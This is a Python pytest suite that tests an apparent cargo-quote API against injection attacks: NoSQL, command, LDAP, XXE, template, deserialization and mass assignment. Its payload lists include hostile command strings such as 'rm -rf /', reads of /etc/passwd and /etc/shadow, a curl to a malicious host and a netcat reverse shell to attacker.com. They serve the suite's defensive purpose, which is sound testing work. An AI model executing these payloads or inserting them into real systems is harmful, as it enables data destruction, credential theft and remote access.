"""
Injection Attack Tests

Comprehensive tests for various injection attacks.
"""

import pytest
from httpx import AsyncClient
from fastapi import status


# ============================================================================
# NoSQL Injection Tests
# ============================================================================

class TestNoSQLInjection:
    """Test NoSQL injection prevention."""
    
    @pytest.mark.asyncio
    async def test_nosql_operator_injection(
        self, async_client: AsyncClient, auth_headers
    ):
        """Test NoSQL operator injection."""
        payloads = [
            {"$gt": ""},
            {"$ne": None},
            {"$or": [{"a": 1}, {"b": 2}]},
            {"$where": "this.password.length > 0"}
        ]
        
        for payload in payloads:
            response = await async_client.get(
                "/api/v3/quotes/",
                params={"status": str(payload)},
                headers=auth_headers
            )
            
            # Should handle safely
            assert response.status_code in [200, 400, 422]
            
            # Should not return unauthorized data
            if response.status_code == 200:
                data = response.json()
                # Verify response is safe
                assert isinstance(data, (list, dict))
    
    @pytest.mark.asyncio
    async def test_nosql_injection_in_json_body(
        self, async_client: AsyncClient, auth_headers
    ):
        """Test NoSQL injection in JSON body."""
        malicious_payload = {
            "origin_port": {"$ne": None},
            "destination_port": "USLAX",
            "cargo_type": "ELECTRONICS",
            "cargo_value_usd": 500000,
            "departure_date": "2024-03-15",
            "arrival_date": "2024-04-05"
        }
        
        response = await async_client.post(
            "/api/v3/quotes/request",
            json=malicious_payload,
            headers=auth_headers
        )
        
        # Should reject invalid data type
        assert response.status_code in [400, 422]
    
    @pytest.mark.asyncio
    async def test_nosql_regex_injection(
        self, async_client: AsyncClient, auth_headers
    ):
        """Test NoSQL regex injection."""
        regex_payloads = [
            {"$regex": ".*"},
            {"$regex": "^admin"},
            {"$options": "i"}
        ]
        
        for payload in regex_payloads:
            response = await async_client.get(
                "/api/v3/quotes/",
                params={"cargo_type": str(payload)},
                headers=auth_headers
            )
            
            # Should reject or handle safely
            assert response.status_code in [200, 400, 422]


# ============================================================================
# Command Injection Tests
# ============================================================================

class TestCommandInjection:
    """Test command injection prevention."""
    
    @pytest.mark.asyncio
    async def test_command_injection_in_filename(
        self, async_client: AsyncClient, auth_headers
    ):
        """Test command injection via filename."""
        payloads = [
            "test; cat /etc/passwd",
            "test | ls -la",
            "test`whoami`",
            "test$(id)",
            "test & dir",
            "test && cat /etc/shadow"
        ]
        
        for payload in payloads:
            # Simulate file upload with malicious filename
            response = await async_client.post(
                "/api/v3/documents/upload",
                files={"file": (payload, b"test content", "text/plain")},
                headers=auth_headers
            )
            
            # Should sanitize filename
            if response.status_code == 200:
                data = response.json()
                if "filename" in data:
                    filename = data["filename"]
                    # Dangerous characters should be removed
                    assert ";" not in filename
                    assert "|" not in filename
                    assert "`" not in filename
                    assert "$(" not in filename
                    assert "&&" not in filename
    
    @pytest.mark.asyncio
    async def test_command_injection_in_export(
        self, async_client: AsyncClient, auth_headers
    ):
        """Test command injection in export filename."""
        malicious_names = [
            "../../../etc/passwd",
            "test; rm -rf /",
            "$(curl malicious.com)",
            "|nc -e /bin/bash attacker.com 4444"
        ]
        
        for name in malicious_names:
            response = await async_client.post(
                "/api/v3/reports/export",
                json={"filename": name, "format": "csv"},
                headers=auth_headers
            )
            
            # Should reject or sanitize
            if response.status_code == 200:
                # If accepted, filename should be sanitized
                data = response.json()
                if "filename" in data:
                    assert ";" not in data["filename"]
                    assert ".." not in data["filename"]
    
    @pytest.mark.asyncio
    async def test_command_injection_in_template(
        self, async_client: AsyncClient, auth_headers
    ):
        """Test command injection via template rendering."""
        template_payloads = [
            "{{7*7}}",  # Template injection
            "${7*7}",  # Expression injection
            "#{7*7}",  # EL injection
        ]
        
        for payload in template_payloads:
            response = await async_client.post(
                "/api/v3/quotes/request",
                json={
                    "origin_port": "CNSHA",
                    "destination_port": "USLAX",
                    "cargo_type": "ELECTRONICS",
                    "cargo_value_usd": 500000,
                    "departure_date": "2024-03-15",
                    "arrival_date": "2024-04-05",
                    "notes": payload
                },
                headers=auth_headers
            )
            
            # If successful, should not evaluate template
            if response.status_code == 200:
                data = response.json()
                response_str = str(data)
                # Should not contain evaluated result (49)
                assert "49" not in response_str or payload not in response_str


# ============================================================================
# LDAP Injection Tests
# ============================================================================

class TestLDAPInjection:
    """Test LDAP injection prevention."""
    
    @pytest.mark.asyncio
    async def test_ldap_injection_in_auth(
        self, async_client: AsyncClient
    ):
        """Test LDAP injection attempts in authentication."""
        payloads = [
            "*)(uid=*))(|(uid=*",
            "admin)(&)",
            "admin)(|(password=*))",
            "*",
            "user)(cn=*))((|userPassword=*",
        ]
        
        for payload in payloads:
            response = await async_client.post(
                "/api/v3/auth/login",
                json={"email": payload, "password": "test"}
            )
            
            # Should reject or handle safely
            assert response.status_code in [400, 401, 422]
            
            # Should not authenticate with malicious input
            if response.status_code == 200:
                data = response.json()
                assert "access_token" not in data
    
    @pytest.mark.asyncio
    async def test_ldap_injection_in_search(
        self, async_client: AsyncClient, auth_headers
    ):
        """Test LDAP injection in user search."""
        ldap_payloads = [
            "*)(objectClass=*",
            "admin*",
            "*()|&",
            "*)(&(objectClass=user",
        ]
        
        for payload in ldap_payloads:
            response = await async_client.get(
                "/api/v3/users/search",
                params={"query": payload},
                headers=auth_headers
            )
            
            # Should handle safely
            assert response.status_code in [200, 400, 404, 422]


# ============================================================================
# XML Injection Tests
# ============================================================================

class TestXMLInjection:
    """Test XML injection prevention."""
    
    @pytest.mark.asyncio
    async def test_xxe_injection(
        self, async_client: AsyncClient, auth_headers
    ):
        """Test XXE (XML External Entity) injection."""
        xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>'''
        
        response = await async_client.post(
            "/api/v3/import",
            content=xxe_payload,
            headers={
                **auth_headers,
                "Content-Type": "application/xml"
            }
        )
        
        # Should reject XML or handle safely
        if response.status_code == 200:
            response_text = response.text
            # Should not contain sensitive file contents
            assert "root:" not in response_text
            assert "passwd" not in response_text
    
    @pytest.mark.asyncio
    async def test_xml_bomb(
        self, async_client: AsyncClient, auth_headers
    ):
        """Test XML bomb (billion laughs) attack."""
        xml_bomb = '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<data>&lol3;</data>'''
        
        response = await async_client.post(
            "/api/v3/import",
            content=xml_bomb,
            headers={
                **auth_headers,
                "Content-Type": "application/xml"
            }
        )
        
        # Should timeout or reject
        assert response.status_code in [400, 413, 422, 500, 503]
    
    @pytest.mark.asyncio
    async def test_xpath_injection(
        self, async_client: AsyncClient, auth_headers
    ):
        """Test XPath injection."""
        xpath_payloads = [
            "' or '1'='1",
            "' or 1=1 or ''='",
            "x' or name()='username' or 'x'='y",
            "'] | //user/*[contains(*,'",
        ]
        
        for payload in xpath_payloads:
            response = await async_client.get(
                "/api/v3/data/query",
                params={"filter": payload},
                headers=auth_headers
            )
            
            # Should handle safely
            assert response.status_code in [200, 400, 404, 422]


# ============================================================================
# CRLF Injection Tests
# ============================================================================

class TestCRLFInjection:
    """Test CRLF injection prevention."""
    
    @pytest.mark.asyncio
    async def test_crlf_in_headers(
        self, async_client: AsyncClient, auth_headers
    ):
        """Test CRLF injection in response headers."""
        crlf_payloads = [
            "test\r\nX-Injected: true",
            "test\nSet-Cookie: admin=true",
            "test%0d%0aX-Injected: true",
        ]
        
        for payload in crlf_payloads:
            # Try to inject in a value that might be reflected in headers
            response = await async_client.get(
                f"/api/v3/quotes/",
                headers={
                    **auth_headers,
                    "X-Custom-Header": payload
                }
            )
            
            # Should not allow header injection
            assert "X-Injected" not in response.headers
            assert "Set-Cookie" not in str(response.headers) or "admin=true" not in str(response.headers)
    
    @pytest.mark.asyncio
    async def test_crlf_in_redirect(
        self, async_client: AsyncClient
    ):
        """Test CRLF injection in redirect location."""
        malicious_redirect = "http://example.com\r\nX-Injected: true"
        
        response = await async_client.get(
            f"/redirect?url={malicious_redirect}",
            follow_redirects=False
        )
        
        # Should not inject headers via redirect
        if "Location" in response.headers:
            location = response.headers["Location"]
            assert "\r\n" not in location
            assert "\n" not in location


# ============================================================================
# Template Injection Tests
# ============================================================================

class TestTemplateInjection:
    """Test template injection prevention."""
    
    @pytest.mark.asyncio
    async def test_ssti_python(
        self, async_client: AsyncClient, auth_headers
    ):
        """Test Server-Side Template Injection (Python)."""
        ssti_payloads = [
            "{{config}}",
            "{{7*7}}",
            "{{[].__class__.__base__.__subclasses__()}}",
            "${7*7}",
            "#{7*7}",
        ]
        
        for payload in ssti_payloads:
            response = await async_client.post(
                "/api/v3/quotes/request",
                json={
                    "origin_port": "CNSHA",
                    "destination_port": "USLAX",
                    "cargo_type": "ELECTRONICS",
                    "cargo_value_usd": 500000,
                    "departure_date": "2024-03-15",
                    "arrival_date": "2024-04-05",
                    "customer_name": payload
                },
                headers=auth_headers
            )
            
            # Should not evaluate template
            if response.status_code == 200:
                data = response.json()
                response_str = str(data)
                # Should not contain evaluated results
                assert "49" not in response_str or payload in response_str
                assert "<class" not in response_str
    
    @pytest.mark.asyncio
    async def test_ssti_jinja2(
        self, async_client: AsyncClient, auth_headers
    ):
        """Test Jinja2 template injection."""
        jinja_payloads = [
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{% for c in [].__class__.__base__.__subclasses__() %}{% endfor %}",
            "{{config.items()}}",
        ]
        
        for payload in jinja_payloads:
            response = await async_client.post(
                "/api/v3/quotes/request",
                json={
                    "origin_port": "CNSHA",
                    "destination_port": "USLAX",
                    "cargo_type": "ELECTRONICS",
                    "cargo_value_usd": 500000,
                    "departure_date": "2024-03-15",
                    "arrival_date": "2024-04-05",
                    "notes": payload
                },
                headers=auth_headers
            )
            
            # Should not execute template code
            if response.status_code == 200:
                data = response.json()
                response_str = str(data).lower()
                # Should not contain Python objects
                assert "subclasses" not in response_str
                assert "config" not in response_str or "notes" in response_str


# ============================================================================
# Expression Language Injection Tests
# ============================================================================

class TestExpressionInjection:
    """Test expression language injection."""
    
    @pytest.mark.asyncio
    async def test_el_injection(
        self, async_client: AsyncClient, auth_headers
    ):
        """Test Expression Language injection."""
        el_payloads = [
            "${7*7}",
            "#{7*7}",
            "${T(java.lang.System).exit(1)}",
            "${applicationScope}",
        ]
        
        for payload in el_payloads:
            response = await async_client.post(
                "/api/v3/quotes/request",
                json={
                    "origin_port": "CNSHA",
                    "destination_port": "USLAX",
                    "cargo_type": "ELECTRONICS",
                    "cargo_value_usd": 500000,
                    "departure_date": "2024-03-15",
                    "arrival_date": "2024-04-05",
                    "description": payload
                },
                headers=auth_headers
            )
            
            # Should not evaluate expression
            if response.status_code == 200:
                data = response.json()
                response_str = str(data)
                # Should not contain evaluated result
                assert "49" not in response_str or payload in response_str


# ============================================================================
# Object Injection Tests
# ============================================================================

class TestObjectInjection:
    """Test object injection prevention."""
    
    @pytest.mark.asyncio
    async def test_deserialization_attack(
        self, async_client: AsyncClient, auth_headers
    ):
        """Test insecure deserialization."""
        # Attempt to send serialized Python object
        import pickle
        import base64
        
        malicious_object = {"__reduce__": "os.system('whoami')"}
        pickled = base64.b64encode(pickle.dumps(malicious_object)).decode()
        
        response = await async_client.post(
            "/api/v3/data/import",
            json={"data": pickled},
            headers=auth_headers
        )
        
        # Should not deserialize untrusted data
        assert response.status_code in [400, 404, 422]
    
    @pytest.mark.asyncio
    async def test_yaml_injection(
        self, async_client: AsyncClient, auth_headers
    ):
        """Test YAML deserialization attacks."""
        yaml_payload = """
!!python/object/apply:os.system
args: ['whoami']
"""
        
        response = await async_client.post(
            "/api/v3/config/import",
            content=yaml_payload,
            headers={
                **auth_headers,
                "Content-Type": "application/x-yaml"
            }
        )
        
        # Should not execute YAML code
        assert response.status_code in [400, 404, 415, 422]


# ============================================================================
# Mass Assignment Tests
# ============================================================================

class TestMassAssignment:
    """Test mass assignment vulnerabilities."""
    
    @pytest.mark.asyncio
    async def test_privilege_escalation_via_mass_assignment(
        self, async_client: AsyncClient, auth_headers
    ):
        """Test privilege escalation through mass assignment."""
        # Try to set admin role
        malicious_payload = {
            "email": "attacker@example.com",
            "password": "password123",
            "role": "admin",  # Should not be settable
            "is_admin": True,  # Should not be settable
            "permissions": ["all"],  # Should not be settable
        }
        
        response = await async_client.post(
            "/api/v3/users/register",
            json=malicious_payload,
            headers=auth_headers
        )
        
        # If successful, should not have admin privileges
        if response.status_code == 200:
            data = response.json()
            # Should not have admin role
            if "role" in data:
                assert data["role"] != "admin"
            if "is_admin" in data:
                assert data["is_admin"] is False
    
    @pytest.mark.asyncio
    async def test_hidden_field_modification(
        self, async_client: AsyncClient, auth_headers
    ):
        """Test modification of hidden/protected fields."""
        # Try to modify internal fields
        malicious_payload = {
            "cargo_value_usd": 100000,
            "total_premium_usd": 1,  # Should be calculated, not settable
            "status": "BOUND",  # Should follow workflow, not directly settable
            "created_at": "2020-01-01T00:00:00",  # Should be auto-set
        }
        
        response = await async_client.post(
            "/api/v3/quotes/request",
            json={
                **malicious_payload,
                "origin_port": "CNSHA",
                "destination_port": "USLAX",
                "cargo_type": "ELECTRONICS",
                "departure_date": "2024-03-15",
                "arrival_date": "2024-04-05"
            },
            headers=auth_headers
        )
        
        # If successful, protected fields should not be user-controlled
        if response.status_code == 200:
            data = response.json()
            # Premium should be calculated, not user-provided value
            if "total_premium_usd" in data:
                assert data["total_premium_usd"] != 1
